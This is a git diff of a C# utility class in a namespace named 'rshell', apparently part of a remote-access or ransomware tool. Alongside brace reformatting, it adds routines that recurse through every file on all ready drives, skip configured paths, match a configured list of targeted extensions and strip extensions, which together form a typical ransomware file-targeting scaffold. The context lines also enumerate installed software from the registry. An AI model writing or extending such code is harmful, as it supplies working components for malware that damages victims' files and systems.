@@ -9,7 +9,10 @@ using Microsoft.Win32;
 using System.Threading;
 using System.Diagnostics;
 using System.Security.Principal;
+using System.Reflection;
 
+namespace rshell 
+{ 
 class Utils
 {
     public static Random r = new Random();
@@ -98,12 +101,13 @@ class Utils
             catch (Exception)
             {
             }
-        } else if (File.Exists(path))
+        }
+        else if (File.Exists(path))
         {
             //file
             FileInfo fi = new FileInfo(path);
             char[] space = Repeat(" ", depth).ToCharArray();
-            for (int i = 0; i<space.Length; i+=indent)
+            for (int i = 0; i < space.Length; i += indent)
             {
                 space[i] = '│';
             }
@@ -203,7 +207,8 @@ class Utils
 
             RegistryKey key1 = Registry.CurrentUser.OpenSubKey(@"Software", false);
             string[] vendors1 = key1.GetSubKeyNames();
-            foreach (string vendor in vendors1) {
+            foreach (string vendor in vendors1)
+            {
                 RegistryKey vendorKey = key1.OpenSubKey(vendor, false);
                 string[] programs = vendorKey.GetSubKeyNames();
                 foreach (string program in programs)
@@ -315,7 +320,8 @@ class Utils
             pi.ErrorDialog = false;
 
             Process p = Process.Start(pi);
-            new Thread(() => {
+            new Thread(() =>
+            {
                 if (timeoutSeconds > 0)
                 {
                     Thread.Sleep(timeoutSeconds * 1000);
@@ -361,5 +367,97 @@ class Utils
         r.NextBytes(buffer);
         string str = Convert.ToBase64String(buffer);
         return str.Remove(len).Replace(@"/", "3").Replace(@"+", "1").ToUpper();
+    }
+    public static string GetWindowsDrive()
+    {
+        string path = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
+
+        if (path == null)
+            throw new Exception("Failed to get Windows drive.");
+
+        return path;
+    }
+    private static string[] GetReadyDrives()
+    {
+        var drives = new List<string>();
+
+        foreach (var drive in DriveInfo.GetDrives())
+        {
+            if (drive.IsReady) drives.Add(drive.Name);
+        }
+
+        return drives.ToArray();
+    }
+    private static bool IsIgnoredPath(string path)
+    {
+        foreach (var ignoredPath in Settings.ignoredPaths)
+        {
+            if (path.StartsWith(ignoredPath))
+                return true;
+        }
+
+        return false;
+    }
+
+    public delegate void EnumerateFilesCallback(string path);
+
+    public static void EnumerateFiles(EnumerateFilesCallback enumCb)
+    {
+        foreach (var drive in GetReadyDrives())
+            EnumerateFiles(drive, enumCb);
+    }
+
+    public static void EnumerateFiles(string root, EnumerateFilesCallback enumCb)
+    {
+        try
+        {
+            if (File.Exists(root))
+            {
+                enumCb(root);
+                return;
+            }
+
+            foreach (string path in Directory.EnumerateFileSystemEntries(root))
+            {
+                if (File.Exists(path))
+                {
+                    enumCb(path);
+                }
+                else if (Directory.Exists(path) && !IsIgnoredPath(path))
+                {
+                    EnumerateFiles(path, enumCb);
+                }
+            }
+        }
+        catch (Exception) { }
+        }
+        public static bool IsTargetedExtension(string path)
+        {
+            path = path.ToLower();
+
+            foreach (var extension in Settings.extensions)
+            {
+                if (path.EndsWith(extension))
+                {
+                    return true;
+                }
+            }
+
+            return false;
+        }
+        public static string RemoveExtension(string path)
+        {
+            int index = path.LastIndexOf('.');
+
+            if (index == -1)
+                return path;
+
+            return path.Remove(index);
+        }
+        public static string GetParentDirectory()
+        {
+            var fileInfo = new FileInfo(Assembly.GetExecutingAssembly().Location);
+            return fileInfo.DirectoryName;
+        }
     }
 }
